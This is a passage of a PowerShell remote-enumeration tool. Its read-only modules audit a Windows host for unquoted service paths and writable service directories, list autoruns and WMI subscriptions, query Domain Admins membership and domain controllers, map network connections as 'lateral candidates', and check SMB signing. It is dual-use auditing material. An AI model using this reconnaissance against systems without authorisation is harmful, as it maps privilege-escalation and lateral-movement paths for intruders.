        $rows = New-Object System.Collections.Generic.List[object]
        $truncated = New-Object System.Collections.Generic.List[string]
        function Get-ARServiceExePath {
            param([string]$CommandLine)
            if ([string]::IsNullOrWhiteSpace($CommandLine)) { return '' }
            $text = $CommandLine.Trim()
            if ($text.StartsWith('"')) {
                $end = $text.IndexOf('"', 1)
                if ($end -gt 1) { return $text.Substring(1, $end - 1) }
                return ''
            }
            $match = [regex]::Match($text, '^(.+?\.exe)(\s|$)', [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)
            if ($match.Success) { return $match.Groups[1].Value }
            return ($text -split '\s+')[0]
        }
        function Get-ARServiceDirectory {
            param([string]$Path)
            if ([string]::IsNullOrWhiteSpace($Path)) { return '' }
            $expanded = [Environment]::ExpandEnvironmentVariables($Path)
            if ($expanded.StartsWith('\??\')) { $expanded = $expanded.Substring(4) }
            if ($expanded.StartsWith('\SystemRoot\')) { $expanded = $env:SystemRoot + '\' + $expanded.Substring(12) }
            try { return [System.IO.Path]::GetDirectoryName($expanded) } catch { return '' }
        }
        $services = @(Get-CimInstance -ClassName Win32_Service -ErrorAction Stop | Select-Object -First ($cap + 1))
        if ($services.Count -gt $cap) { $services = @($services | Select-Object -First $cap); $truncated.Add('services') }
        $exeCache = @{}
        $writableCache = @{}
        $directoriesChecked = 0
        $directoriesTruncated = $false
        foreach ($service in $services) {
            $pathName = [string]$service.PathName
            $exe = ''
            if (-not [string]::IsNullOrWhiteSpace($pathName)) {
                if ($exeCache.ContainsKey($pathName)) { $exe = [string]$exeCache[$pathName] }
                else {
                    $exe = Get-ARServiceExePath -CommandLine $pathName
                    $exeCache[$pathName] = $exe
                }
            }
            $unquoted = $false
            if (-not [string]::IsNullOrWhiteSpace($pathName) -and -not $pathName.TrimStart().StartsWith('"') -and $pathName -match '\s') {
                if ($pathName -notmatch '^(?i)[^\s]+\.exe(\s|$)') { $unquoted = $true }
            }
            $directory = ''
            $writableDirectory = $false
            if (-not [string]::IsNullOrWhiteSpace($exe)) {
                $directory = Get-ARServiceDirectory -Path $exe
                if (-not [string]::IsNullOrWhiteSpace($directory)) {
                    if ($writableCache.ContainsKey($directory)) { $writableDirectory = [bool]$writableCache[$directory] }
                    elseif ($directoriesChecked -lt $directoryCap) {
                        $directoriesChecked++
                        $isWritable = $false
                        try {
                            $acl = Get-Acl -LiteralPath $directory -ErrorAction Stop
                            foreach ($rule in @($acl.Access | Select-Object -First 512)) {
                                if ($rule.AccessControlType -ne 'Allow') { continue }
                                $identity = [string]$rule.IdentityReference
                                if ($identity -notmatch '(?i)^(Everyone|BUILTIN\\Users|NT AUTHORITY\\Authenticated Users|S-1-1-0|S-1-5-32-545|S-1-5-11)$') { continue }
                                if ([string]$rule.FileSystemRights -match '(?i)(Write|Modify|FullControl|CreateFiles|AppendData)') { $isWritable = $true; break }
                            }
                        }
                        catch { }
                        if (-not $isWritable) {
                            # A failed ACL read (C:\Windows\Temp returns access denied even for admins on some builds) must not hide a classically writable directory.
                            $normalized = $directory.TrimEnd('\')
                            foreach ($known in @(
                                    ($env:SystemRoot + '\Temp'),
                                    ($env:SystemDrive + '\Temp'),
                                    ($env:SystemDrive + '\Users\Public'))) {
                                if ($normalized -eq $known) { $isWritable = $true; break }
                            }
                        }
                        $writableCache[$directory] = $isWritable
                        $writableDirectory = $isWritable
                    }
                    else { $directoriesTruncated = $true }
                }
            }
            $rows.Add([pscustomobject]@{
                Name          = [string]$service.Name
                State         = [string]$service.State
                StartMode     = [string]$service.StartMode
                Account       = [string]$service.StartName
                Path          = $pathName
                Unquoted      = $unquoted
                WritableDir   = $writableDirectory
                Directory     = $directory
            })
        }
        if ($directoriesTruncated) { $truncated.Add('directory ACL checks (first 300 unique directories only)') }
        return [pscustomobject]@{
            Rows      = @($rows.ToArray())
            Truncated = @($truncated.ToArray())
        }
    }
    $rows = @($result.Rows)
    foreach ($item in @($result.Truncated)) { Write-ARWarn ('Collection capped: ' + [string]$item) }
    if ($rows.Count -eq 0) {
        Write-ARInfo 'The service table returned no entries.'
        Set-ARStatus 'Service enumeration: nothing found' 'Ok'
        return
    }
    $unquotedRows = @($rows | Where-Object { $_.Unquoted })
    $writableRows = @($rows | Where-Object { $_.WritableDir })
    foreach ($row in @($unquotedRows | Select-Object -First 200)) {
        Write-ARWarn ('Unquoted service path: ' + [string]$row.Name + ' -> ' + [string]$row.Path)
    }
    foreach ($row in @($writableRows | Select-Object -First 200)) {
        Write-ARWarn ('Service directory allows broad writes: ' + [string]$row.Name + ' -> ' + [string]$row.Directory)
    }
    Write-ARInfo ('Services: ' + [string]$rows.Count + '; unquoted paths: ' + [string]$unquotedRows.Count + '; writable directories: ' + [string]$writableRows.Count + '.')
    $flagged = @($rows | Where-Object { $_.Unquoted -or $_.WritableDir } | Sort-Object Name)
    if ($flagged.Count -gt 0) {
        Show-ARText ($flagged | Format-Table Name, State, StartMode, Account, Unquoted, WritableDir, Path -AutoSize -Wrap)
    }
    $plain = @($rows | Where-Object { -not $_.Unquoted -and -not $_.WritableDir } | Sort-Object Name)
    if ($plain.Count -gt 0) {
        $preview = @($plain | Select-Object -First 40)
        Show-ARText ($preview | Format-Table Name, State, StartMode, Account, Path -AutoSize -Wrap)
        if ($plain.Count -gt $preview.Count) { Write-ARInfo ('Only the first 40 of ' + [string]$plain.Count + ' unremarkable services are printed.') }
    }
    Write-ARInfo 'Read-only: service configuration was queried, never modified.'
    Set-ARStatus 'Service enumeration complete' 'Ok'
}

function Invoke-ARModuleAutoruns {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Autorun enumeration'
    $session = Get-ARTargetSession
    $result = Invoke-ARRemote -Session $session -ScriptBlock {
        $cap = 2000
        $rows = New-Object System.Collections.Generic.List[object]
        $truncated = New-Object System.Collections.Generic.List[string]
        $runKeys = @(
            @('HKLM', 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'),
            @('HKLM', 'SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce'),
            @('HKLM', 'SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run'),
            @('HKLM', 'SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce'),
            @('HKCU', 'Software\Microsoft\Windows\CurrentVersion\Run'),
            @('HKCU', 'Software\Microsoft\Windows\CurrentVersion\RunOnce')
        )
        foreach ($pair in $runKeys) {
            if ($rows.Count -ge $cap) { $truncated.Add('autorun entries'); break }
            $location = $pair[0] + '\' + $pair[1]
            $key = $null
            try { $key = Get-Item -LiteralPath ($pair[0] + ':\' + $pair[1]) -ErrorAction Stop } catch { continue }
            foreach ($valueName in @($key.GetValueNames() | Select-Object -First ($cap + 1))) {
                if ($rows.Count -ge $cap) { $truncated.Add('autorun entries'); break }
                $value = ''
                try { $value = [string]$key.GetValue($valueName, '', [Microsoft.Win32.RegistryValueOptions]::DoNotExpandEnvironmentNames) } catch { }
                $rows.Add([pscustomobject]@{ Type = 'Run'; Location = $location; Name = [string]$valueName; Value = $value })
            }
            $key.Close()
        }
        $profileList = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList'
        $sidNames = @{}
        try {
            foreach ($profileKey in @(Get-ChildItem -LiteralPath $profileList -ErrorAction Stop | Select-Object -First 64)) {
                $sid = $profileKey.PSChildName
                $profilePath = ''
                try { $profilePath = [string](Get-ItemProperty -LiteralPath $profileKey.PSPath -Name 'ProfileImagePath' -ErrorAction Stop).ProfileImagePath } catch { }
                if (-not [string]::IsNullOrWhiteSpace($profilePath)) { $sidNames[$sid] = Split-Path -Leaf $profilePath }
            }
        }
        catch { }
        $usersRoot = [Microsoft.Win32.Registry]::Users
        foreach ($sid in @($usersRoot.GetSubKeyNames() | Select-Object -First 64)) {
            if ($rows.Count -ge $cap) { $truncated.Add('per-user autorun entries'); break }
            $label = $sid
            if ($sidNames.ContainsKey($sid)) { $label = [string]$sidNames[$sid] + ' (' + $sid + ')' }
            foreach ($subName in @('Run', 'RunOnce')) {
                $key = $null
                try { $key = $usersRoot.OpenSubKey($sid + '\Software\Microsoft\Windows\CurrentVersion\' + $subName) } catch { continue }
                if ($null -eq $key) { continue }
                foreach ($valueName in @($key.GetValueNames() | Select-Object -First ($cap + 1))) {
                    if ($rows.Count -ge $cap) { $truncated.Add('per-user autorun entries'); break }
                    $value = ''
                    try { $value = [string]$key.GetValue($valueName, '', [Microsoft.Win32.RegistryValueOptions]::DoNotExpandEnvironmentNames) } catch { }
                    $rows.Add([pscustomobject]@{
                        Type     = 'Run'
                        Location = ('HKU\' + $label + '\Software\Microsoft\Windows\CurrentVersion\' + $subName)
                        Name     = [string]$valueName
                        Value    = $value
                    })
                }
                $key.Close()
            }
        }
        $startupDirs = New-Object System.Collections.Generic.List[string]
        try { $startupDirs.Add([Environment]::GetFolderPath('CommonStartup')) } catch { }
        try { $startupDirs.Add([Environment]::GetFolderPath('Startup')) } catch { }
        try {
            foreach ($profileRoot in @(Get-ChildItem -LiteralPath (Join-Path $env:SystemDrive 'Users') -Directory -ErrorAction SilentlyContinue | Select-Object -First 64)) {
                $startupDirs.Add((Join-Path $profileRoot.FullName 'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'))
            }
        }
        catch { }
        foreach ($startupDir in @($startupDirs | Where-Object { -not [string]::IsNullOrWhiteSpace($_) } | Select-Object -Unique)) {
            if ($rows.Count -ge $cap) { $truncated.Add('startup folder entries'); break }
            if (-not (Test-Path -LiteralPath $startupDir)) { continue }
            foreach ($file in @(Get-ChildItem -LiteralPath $startupDir -File -ErrorAction SilentlyContinue | Select-Object -First 200)) {
                if ($rows.Count -ge $cap) { $truncated.Add('startup folder entries'); break }
                $rows.Add([pscustomobject]@{ Type = 'Startup'; Location = $startupDir; Name = $file.Name; Value = $file.FullName })
            }
        }
        $subscriptionClasses = @(
            @('__EventFilter', 'WmiFilter'),
            @('CommandLineEventConsumer', 'WmiConsumer'),
            @('ActiveScriptEventConsumer', 'WmiConsumer'),
            @('__FilterToConsumerBinding', 'WmiBinding')
        )
        foreach ($classPair in $subscriptionClasses) {
            if ($rows.Count -ge $cap) { $truncated.Add('WMI subscription entries'); break }
            $items = @()
            try { $items = @(Get-WmiObject -Namespace 'root\subscription' -Class $classPair[0] -ErrorAction Stop | Select-Object -First ($cap + 1)) }
            catch { continue }
            foreach ($item in $items) {
                if ($rows.Count -ge $cap) { $truncated.Add('WMI subscription entries'); break }
                $detail = ''
                if ($classPair[0] -eq '__EventFilter') { $detail = [string]$item.Query }
                elseif ($classPair[0] -eq 'CommandLineEventConsumer') { $detail = [string]$item.CommandLineTemplate }
                elseif ($classPair[0] -eq 'ActiveScriptEventConsumer') { $detail = [string]$item.ScriptText }
                else { $detail = [string]$item.Filter + ' -> ' + [string]$item.Consumer }
                if ($detail.Length -gt 500) { $detail = $detail.Substring(0, 500) + '...' }
                $rows.Add([pscustomobject]@{
                    Type     = [string]$classPair[1]
                    Location = ('root\subscription:' + [string]$classPair[0])
                    Name     = [string]$item.Name
                    Value    = $detail
                })
            }
        }
        foreach ($winlogonKey in @(
                'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
                'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Winlogon')) {
            foreach ($valueName in @('Shell', 'Userinit')) {
                if ($rows.Count -ge $cap) { $truncated.Add('Winlogon entries'); break }
                try {
                    $value = [string](Get-ItemProperty -LiteralPath $winlogonKey -Name $valueName -ErrorAction Stop).$valueName
                    $rows.Add([pscustomobject]@{ Type = 'Winlogon'; Location = $winlogonKey; Name = $valueName; Value = $value })
                }
                catch { }
            }
        }
        return [pscustomobject]@{
            Rows      = @($rows.ToArray())
            Truncated = @($truncated.ToArray())
        }
    }
    $rows = @($result.Rows)
    foreach ($item in @($result.Truncated)) { Write-ARWarn ('Collection capped at 2000 items: ' + [string]$item) }
    if ($rows.Count -eq 0) {
        Write-ARInfo 'No autorun entry was found in the Run keys, Startup folders, WMI subscriptions or Winlogon.'
        Set-ARStatus 'Autorun enumeration: nothing found' 'Ok'
        return
    }
    $preview = @($rows | Sort-Object Type, Location, Name | Select-Object -First 200)
    Show-ARText ($preview | Format-Table Type, Location, Name, Value -AutoSize -Wrap)
    if ($rows.Count -gt $preview.Count) { Write-ARInfo ('Only the first 200 of ' + [string]$rows.Count + ' autorun entries are printed.') }
    Write-ARSuccess ('Autorun entries found: ' + [string]$rows.Count + '.')
    Write-ARInfo 'Read-only: registry keys, folders and WMI subscriptions were only read.'
    Set-ARStatus 'Autorun enumeration complete' 'Ok'
}

function Invoke-ARModuleDomainInfo {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Domain information'
    $session = Get-ARTargetSession
    $result = Invoke-ARRemote -Session $session -ScriptBlock {
        $cap = 2000
        $computer = Get-CimInstance -ClassName Win32_ComputerSystem -ErrorAction Stop
        $partOfDomain = [bool]$computer.PartOfDomain
        $domain = [string]$computer.Domain
        if (-not $partOfDomain) {
            return [pscustomobject]@{ Joined = $false; Domain = $domain; Sections = @() }
        }
        $sections = New-Object System.Collections.Generic.List[object]
        $specs = @(
            [pscustomobject]@{ Label = 'net accounts'; File = 'net.exe'; Arguments = @('accounts') },
            [pscustomobject]@{ Label = 'net group "Domain Admins" /domain'; File = 'net.exe'; Arguments = @('group', 'Domain Admins', '/domain') }
        )
        $safeDomain = ($domain -match '^[A-Za-z0-9][A-Za-z0-9.-]{0,254}$')
        if ($safeDomain) {
            $specs += [pscustomobject]@{ Label = ('nltest /dsgetdc:' + $domain); File = 'nltest.exe'; Arguments = @('/dsgetdc:' + $domain) }
        }
        foreach ($spec in $specs) {
            $lines = @()
            $exitCode = -1
            try {
                $arguments = @($spec.Arguments)
                $lines = @(& $spec.File @arguments 2>&1 | ForEach-Object { [string]$_ } | Select-Object -First ($cap + 1))
                $exitCode = [int]$LASTEXITCODE
            }
            catch {
                $lines = @($_.Exception.Message)
                $exitCode = -1
            }
            $lineTruncated = $false
            if ($lines.Count -gt $cap) { $lines = @($lines | Select-Object -First $cap); $lineTruncated = $true }
            $sections.Add([pscustomobject]@{
                Command   = [string]$spec.Label
                ExitCode  = $exitCode
                Output    = ($lines -join "`r`n")
                Truncated = $lineTruncated
            })
        }
        if (-not $safeDomain) {
            $sections.Add([pscustomobject]@{
                Command   = 'nltest /dsgetdc'
                ExitCode  = -1
                Output    = 'The domain name contains characters outside [A-Za-z0-9.-]; nltest was not invoked.'
                Truncated = $false
            })
        }
        return [pscustomobject]@{
            Joined   = $true
            Domain   = $domain
            Sections = @($sections.ToArray())
        }
    }
    if (-not [bool]$result.Joined) {
        Write-ARInfo ('Host is not domain joined: workgroup ' + [string]$result.Domain + '. No domain query was run.')
        Set-ARStatus 'Domain info: host is not domain joined' 'Ok'
        return
    }
    Write-ARInfo ('Domain: ' + [string]$result.Domain)
    foreach ($section in @($result.Sections)) {
        Write-Host ('--- ' + [string]$section.Command + ' (exit ' + [string]$section.ExitCode + ') ---') -ForegroundColor DarkGray
        if ([string]::IsNullOrWhiteSpace([string]$section.Output)) { Write-Host '(no output)' -ForegroundColor Gray }
        else { Write-Host ([string]$section.Output) -ForegroundColor Gray }
        if ([bool]$section.Truncated) { Write-ARWarn ('Output of ' + [string]$section.Command + ' capped at 2000 lines.') }
    }
    Write-ARInfo 'Read-only: domain queries do not change accounts, groups or the host.'
    Set-ARStatus 'Domain information complete' 'Ok'
}

function Invoke-ARModuleNetworkConfig {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Network configuration'
    $session = Get-ARTargetSession
    $result = Invoke-ARRemote -Session $session -ScriptBlock {
        $cap = 2000
        $adapters = New-Object System.Collections.Generic.List[object]
        $routes = New-Object System.Collections.Generic.List[object]
        $proxies = New-Object System.Collections.Generic.List[object]
        $truncated = New-Object System.Collections.Generic.List[string]
        $adapterRows = @(Get-CimInstance -ClassName Win32_NetworkAdapterConfiguration -Filter 'IPEnabled=True' -ErrorAction SilentlyContinue | Select-Object -First ($cap + 1))
        if ($adapterRows.Count -gt $cap) { $truncated.Add('adapters'); $adapterRows = @($adapterRows | Select-Object -First $cap) }
        foreach ($adapter in $adapterRows) {
            $adapters.Add([pscustomobject]@{
                Name    = [string]$adapter.Description
                IP      = (@($adapter.IPAddress) -join ', ')
                Subnet  = (@($adapter.IPSubnet) -join ', ')
                Gateway = (@($adapter.DefaultIPGateway) -join ', ')
                DNS     = (@($adapter.DNSServerSearchOrder) -join ', ')
                MAC     = [string]$adapter.MACAddress
                DHCP    = [string]$adapter.DHCPEnabled
            })
        }
        $routeRows = @(Get-CimInstance -ClassName Win32_IP4RouteTable -ErrorAction SilentlyContinue | Select-Object -First ($cap + 1))
        if ($routeRows.Count -gt $cap) { $truncated.Add('routes'); $routeRows = @($routeRows | Select-Object -First $cap) }
        foreach ($route in $routeRows) {
            $routes.Add([pscustomobject]@{
                Destination = [string]$route.Destination
                Mask        = [string]$route.Mask
                NextHop     = [string]$route.NextHop
                Metric      = [string]$route.Metric1
                Interface   = [string]$route.InterfaceIndex
            })
        }
        $proxyKeys = @(
            [pscustomobject]@{ Scope = 'HKCU'; Path = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' },
            [pscustomobject]@{ Scope = 'HKLM'; Path = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings' }
        )
        foreach ($proxyKey in $proxyKeys) {
            try {
                $item = Get-ItemProperty -LiteralPath $proxyKey.Path -ErrorAction Stop
                $proxies.Add([pscustomobject]@{
                    Scope          = [string]$proxyKey.Scope
                    ProxyEnable    = [string]$item.ProxyEnable
                    ProxyServer    = [string]$item.ProxyServer
                    ProxyOverride  = [string]$item.ProxyOverride
                    AutoConfigURL  = [string]$item.AutoConfigURL
                })
            }
            catch { }
        }
        $usersRoot = [Microsoft.Win32.Registry]::Users
        foreach ($sid in @($usersRoot.GetSubKeyNames() | Select-Object -First 64)) {
            $key = $null
            try { $key = $usersRoot.OpenSubKey($sid + '\Software\Microsoft\Windows\CurrentVersion\Internet Settings') } catch { continue }
            if ($null -eq $key) { continue }
            $proxies.Add([pscustomobject]@{
                Scope         = ('HKU\' + $sid)
                ProxyEnable   = [string]$key.GetValue('ProxyEnable', '')
                ProxyServer   = [string]$key.GetValue('ProxyServer', '')
                ProxyOverride = [string]$key.GetValue('ProxyOverride', '')
                AutoConfigURL = [string]$key.GetValue('AutoConfigURL', '')
            })
            $key.Close()
        }
        $winHttp = ''
        try { $winHttp = ((& netsh.exe winhttp show proxy 2>&1 | ForEach-Object { [string]$_ } | Select-Object -First 64) -join "`r`n") }
        catch { $winHttp = $_.Exception.Message }
        return [pscustomobject]@{
            Adapters  = @($adapters.ToArray())
            Routes    = @($routes.ToArray())
            Proxies   = @($proxies.ToArray())
            WinHttp   = $winHttp
            Truncated = @($truncated.ToArray())
        }
    }
    foreach ($item in @($result.Truncated)) { Write-ARWarn ('Collection capped at 2000 items: ' + [string]$item) }
    $adapters = @($result.Adapters)
    if ($adapters.Count -gt 0) {
        Show-ARText ($adapters | Format-Table Name, IP, Gateway, DNS, MAC, DHCP -AutoSize -Wrap)
    }
    else { Write-ARInfo 'No IP-enabled adapter was returned.' }
    $routes = @($result.Routes)
    if ($routes.Count -gt 0) {
        $preview = @($routes | Select-Object -First 100)
        Show-ARText ($preview | Format-Table Destination, Mask, NextHop, Metric, Interface -AutoSize)
        if ($routes.Count -gt $preview.Count) { Write-ARInfo ('Only the first 100 of ' + [string]$routes.Count + ' IPv4 routes are printed.') }
    }
    $proxies = @($result.Proxies)
    if ($proxies.Count -gt 0) {
        Show-ARText ($proxies | Format-Table Scope, ProxyEnable, ProxyServer, AutoConfigURL -AutoSize -Wrap)
    }
    else { Write-ARInfo 'No WinINET proxy key was readable.' }
    Write-Host '--- netsh winhttp show proxy ---' -ForegroundColor DarkGray
    if ([string]::IsNullOrWhiteSpace([string]$result.WinHttp)) { Write-Host '(no output)' -ForegroundColor Gray }
    else { Write-Host ([string]$result.WinHttp) -ForegroundColor Gray }
    Write-ARSuccess ('Network configuration: ' + [string]$adapters.Count + ' adapters, ' + [string]$routes.Count + ' routes, ' + [string]$proxies.Count + ' proxy entries.')
    Write-ARInfo 'Read-only: adapter, route and proxy settings were only read.'
    Set-ARStatus 'Network configuration complete' 'Ok'
}

function Invoke-ARModuleArpTable {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'ARP and connection enumeration'
    $session = Get-ARTargetSession
    $result = Invoke-ARRemote -Session $session -ScriptBlock {
        $cap = 2000
        $neighbors = New-Object System.Collections.Generic.List[object]
        $connections = New-Object System.Collections.Generic.List[object]
        $truncated = New-Object System.Collections.Generic.List[string]
        $neighborSource = 'Get-NetNeighbor'
        $neighborRows = @()
        try {
            $neighborRows = @(Get-NetNeighbor -AddressFamily IPv4 -ErrorAction Stop | Where-Object { [string]$_.State -ne 'Unreachable' } | Select-Object -First ($cap + 1))
        }
        catch {
            $neighborSource = 'arp'
            $lines = @(& arp.exe -a 2>&1 | ForEach-Object { [string]$_ } | Select-Object -First ($cap + 1))
            if ($lines.Count -gt $cap) { $truncated.Add('ARP neighbours') }
            foreach ($line in @($lines | Select-Object -First $cap)) {
                $match = [regex]::Match($line, '^\s*(\d{1,3}(?:\.\d{1,3}){3})\s+([0-9a-fA-F-]{17})\s+(\S+)')
                if (-not $match.Success) { continue }
                $ip = $match.Groups[1].Value
                if ($ip -eq '255.255.255.255' -or $ip -eq '0.0.0.0') { continue }
                if ($ip -match '^(22[4-9]|23[0-9])\.') { continue }
                $neighbors.Add([pscustomobject]@{ IP = $ip; MAC = $match.Groups[2].Value; State = $match.Groups[3].Value; Interface = ''; Source = 'arp' })
            }
        }
        if ($neighborSource -eq 'Get-NetNeighbor') {
            if ($neighborRows.Count -gt $cap) { $neighborRows = @($neighborRows | Select-Object -First $cap); $truncated.Add('ARP neighbours') }
            foreach ($neighbor in $neighborRows) {
                $ip = [string]$neighbor.IPAddress
                if ($ip -eq '255.255.255.255' -or $ip -eq '0.0.0.0') { continue }
                if ($ip -match '^(22[4-9]|23[0-9])\.') { continue }
                $neighbors.Add([pscustomobject]@{
                    IP        = $ip
                    MAC       = [string]$neighbor.LinkLayerAddress
                    State     = [string]$neighbor.State
                    Interface = [string]$neighbor.InterfaceAlias
                    Source    = $neighborSource
                })
            }
        }
        $tcpSource = 'Get-NetTCPConnection'
        $tcpRows = @()
        try {
            $tcpRows = @(Get-NetTCPConnection -State Established -ErrorAction Stop | Select-Object -First ($cap + 1))
        }
        catch {
            $tcpSource = 'netstat'
            $lines = @(& netstat.exe -ano 2>&1 | ForEach-Object { [string]$_ } | Select-Object -First ($cap + 1))
            if ($lines.Count -gt $cap) { $truncated.Add('TCP connections') }
            foreach ($line in @($lines | Select-Object -First $cap)) {
                $fields = @($line.Trim() -split '\s+')
                if ($fields.Count -lt 5) { continue }
                if ($fields[0] -ne 'TCP') { continue }
                if ($fields[3] -ne 'ESTABLISHED') { continue }
                $localAddress = ''
                $localPort = 0
                $remoteAddress = ''
                $remotePort = 0
                $localText = [string]$fields[1]
                $remoteText = [string]$fields[2]
                $localSplit = $localText.LastIndexOf(':')
                $remoteSplit = $remoteText.LastIndexOf(':')
                if ($localSplit -gt 0) {
                    $localAddress = $localText.Substring(0, $localSplit)
                    [int]::TryParse($localText.Substring($localSplit + 1), [ref]$localPort) | Out-Null
                }
                if ($remoteSplit -gt 0) {
                    $remoteAddress = $remoteText.Substring(0, $remoteSplit)
                    [int]::TryParse($remoteText.Substring($remoteSplit + 1), [ref]$remotePort) | Out-Null
                }
                $processId = 0
                [int]::TryParse([string]$fields[4], [ref]$processId) | Out-Null
                $connections.Add([pscustomobject]@{
                    LocalAddress  = $localAddress
                    LocalPort     = $localPort
                    RemoteAddress = $remoteAddress
                    RemotePort    = $remotePort
                    Pid           = $processId
                    Process       = ''
                    Scope         = ''
                })
            }
        }
        if ($tcpSource -eq 'Get-NetTCPConnection') {
            if ($tcpRows.Count -gt $cap) { $tcpRows = @($tcpRows | Select-Object -First $cap); $truncated.Add('TCP connections') }
            foreach ($connection in $tcpRows) {
                $connections.Add([pscustomobject]@{
                    LocalAddress  = [string]$connection.LocalAddress
                    LocalPort     = [int]$connection.LocalPort
                    RemoteAddress = [string]$connection.RemoteAddress
                    RemotePort    = [int]$connection.RemotePort
                    Pid           = [int]$connection.OwningProcess
                    Process       = ''
                    Scope         = ''
                })
            }
        }
        $processNames = @{}
        try {
            foreach ($process in @(Get-Process -ErrorAction SilentlyContinue | Select-Object -First $cap)) {
                $processNames[[int]$process.Id] = [string]$process.ProcessName
            }
        }
        catch { }
        foreach ($connection in $connections) {
            if ($processNames.ContainsKey([int]$connection.Pid)) { $connection.Process = [string]$processNames[[int]$connection.Pid] }
            $remoteAddress = [string]$connection.RemoteAddress
            if ($remoteAddress -eq '127.0.0.1' -or $remoteAddress -eq '::1') { $connection.Scope = 'Loopback' }
            elseif ($remoteAddress -match '^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.|fc|fd)') { $connection.Scope = 'Private' }
            elseif ($remoteAddress -match '^(169\.254\.|fe80:)') { $connection.Scope = 'LinkLocal' }
            elseif ($remoteAddress -eq '' -or $remoteAddress -eq '0.0.0.0' -or $remoteAddress -eq '::') { $connection.Scope = 'Unspecified' }
            else { $connection.Scope = 'Public' }
        }
        return [pscustomobject]@{
            Neighbors      = @($neighbors.ToArray())
            Connections    = @($connections.ToArray())
            NeighborSource = $neighborSource
            TcpSource      = $tcpSource
            Truncated      = @($truncated.ToArray())
        }
    }
    foreach ($item in @($result.Truncated)) { Write-ARWarn ('Collection capped at 2000 items: ' + [string]$item) }
    $neighbors = @($result.Neighbors)
    Write-ARInfo ('ARP source: ' + [string]$result.NeighborSource + '; TCP source: ' + [string]$result.TcpSource)
    if ($neighbors.Count -gt 0) {
        Show-ARText ($neighbors | Sort-Object IP | Format-Table IP, MAC, State, Interface -AutoSize)
    }
    else { Write-ARInfo 'The ARP table is empty or could not be read.' }
    $connections = @($result.Connections)
    if ($connections.Count -eq 0) {
        Write-ARInfo 'No established TCP connection was found.'
        Set-ARStatus 'ARP and connection enumeration: nothing found' 'Ok'
        return
    }
    $private = @($connections | Where-Object { $_.Scope -eq 'Private' })
    if ($private.Count -gt 0) {
        Write-ARWarn ('Established connections into private address space (lateral candidates): ' + [string]$private.Count + '.')
        Show-ARText ($private | Sort-Object RemoteAddress, RemotePort | Format-Table RemoteAddress, RemotePort, Process, Pid, LocalAddress, LocalPort -AutoSize)
    }
    $others = @($connections | Where-Object { $_.Scope -ne 'Private' } | Select-Object -First 100)
    if ($others.Count -gt 0) {
        Show-ARText ($others | Sort-Object Scope, RemoteAddress | Format-Table RemoteAddress, RemotePort, Process, Pid, Scope -AutoSize)
    }
    Write-ARSuccess ('Established TCP connections: ' + [string]$connections.Count + '; ARP neighbours: ' + [string]$neighbors.Count + '.')
    Write-ARInfo 'Read-only: the ARP cache and connection table were only read.'
    Set-ARStatus 'ARP and connection enumeration complete' 'Ok'
}

function Invoke-ARModuleSmbAudit {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'SMB posture audit'
    $session = Get-ARTargetSession
    $result = Invoke-ARRemote -Session $session -ScriptBlock {
        $values = New-Object System.Collections.Generic.List[object]
        $notes = New-Object System.Collections.Generic.List[string]
        $serverConfig = $null
        $clientConfig = $null
        try { $serverConfig = Get-SmbServerConfiguration -ErrorAction Stop }
        catch { $notes.Add('Get-SmbServerConfiguration: ' + $_.Exception.Message) }
        try { $clientConfig = Get-SmbClientConfiguration -ErrorAction Stop }
        catch { $notes.Add('Get-SmbClientConfiguration: ' + $_.Exception.Message) }
        if ($null -ne $serverConfig) {
            foreach ($name in @('EnableSMB1Protocol', 'RequireSecuritySignature', 'EnableSecuritySignature', 'RestrictNullSessAccess', 'EnableGuestAccess', 'NullSessionShares', 'NullSessionPipes')) {
                $property = $serverConfig.PSObject.Properties[$name]
                if ($null -eq $property) { continue }
                $value = $property.Value
                if ($value -is [array]) { $value = ($value -join ', ') }
                $values.Add([pscustomobject]@{ Scope = 'SmbServerConfiguration'; Name = $name; Value = [string]$value })
            }
        }
        if ($null -ne $clientConfig) {
            foreach ($name in @('RequireSecuritySignature', 'EnableSecuritySignature')) {
                $property = $clientConfig.PSObject.Properties[$name]
                if ($null -eq $property) { continue }
                $values.Add([pscustomobject]@{ Scope = 'SmbClientConfiguration'; Name = $name; Value = [string]$property.Value })
            }
        }
        $serverParams = 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters'
        $clientParams = 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters'
        $lsaParams = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
        foreach ($name in @('SMB1', 'RequireSecuritySignature', 'EnableSecuritySignature', 'RestrictNullSessAccess', 'NullSessionShares', 'NullSessionPipes', 'EnableGuestAccess')) {
            try {
                $value = (Get-ItemProperty -LiteralPath $serverParams -Name $name -ErrorAction Stop).$name
                if ($value -is [array]) { $value = ($value -join ', ') }
                $values.Add([pscustomobject]@{ Scope = 'LanmanServer\Parameters'; Name = $name; Value = [string]$value })
            }
            catch { }
        }
        foreach ($name in @('RequireSecuritySignature', 'EnableSecuritySignature')) {
            try {
                $value = (Get-ItemProperty -LiteralPath $clientParams -Name $name -ErrorAction Stop).$name
                $values.Add([pscustomobject]@{ Scope = 'LanmanWorkstation\Parameters'; Name = $name; Value = [string]$value })
            }
            catch { }
        }
